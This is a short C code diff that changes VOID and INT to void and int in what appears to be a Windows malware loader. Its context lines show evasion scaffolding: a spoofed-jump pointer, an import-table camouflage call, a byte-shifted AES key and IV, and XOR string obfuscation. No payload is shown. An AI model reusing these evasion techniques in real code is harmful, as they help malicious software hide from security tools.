@@ -26,7 +26,7 @@ LPVOID spoofJump;
 HMODULE hKernel32;
 HMODULE hNtdll;
 
-VOID FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv) {
+void FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv) {
 
     for (int i = 0; i < IV_SIZE; i++) {
         ctAesIv[i] -= 0x03;
@@ -44,7 +44,7 @@ VOID FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv) {
     }
 }
 
-VOID XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, const SIZE_T sKeySize) {
+void XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, const SIZE_T sKeySize) {
 
     size_t wStringSize = wcslen(szString);
 
@@ -59,7 +59,7 @@ VOID XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, co
     szResult[wStringSize] = L'\0';
 }
 
-INT NewMain()
+int NewMain()
 {
     IatCamouflage();
 
